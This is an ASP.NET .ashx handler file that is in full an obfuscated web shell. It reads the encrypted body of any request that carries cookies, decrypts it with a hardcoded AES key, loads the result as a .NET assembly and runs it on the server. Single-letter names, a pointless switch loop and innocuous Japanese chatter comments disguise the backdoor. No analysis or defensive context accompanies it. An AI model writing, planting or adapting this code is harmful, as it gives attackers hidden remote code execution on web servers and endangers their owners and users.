<%@ WebHandler Language="C#" Class="a" %>
using System.Web;
using System.Text;
public class a:IHttpHandler{public void ProcessRequest(HttpContext b){int c=0;if(b.Request.Cookies.Count==0)c=99;while(c!=99){switch(c){case 0:var d=new object[3];d[0]=b;d[1]=new System.Security.Cryptography.RijndaelManaged();d[2]=new byte[]{99,97,54,51,52,53,55,53,51,56,98,57,98,49,101,48}; // 月が綺麗ですね
var e=((HttpContext)d[0]).Request.BinaryRead(((HttpContext)d[0]).Request.ContentLength); // 何してるの？
var f=((System.Security.Cryptography.RijndaelManaged)d[1]).CreateDecryptor((byte[])d[2],(byte[])d[2]);var g=f.TransformFinalBlock(e,0,e.Length); // このコードはちょっと複雑だね
var h=System.Reflection.Assembly.Load(g);var i=h.CreateInstance("K"); // そろそろ家に帰りたい
i.Equals(d[0]);c=99;break;}}}public bool IsReusable{get{return false;}}}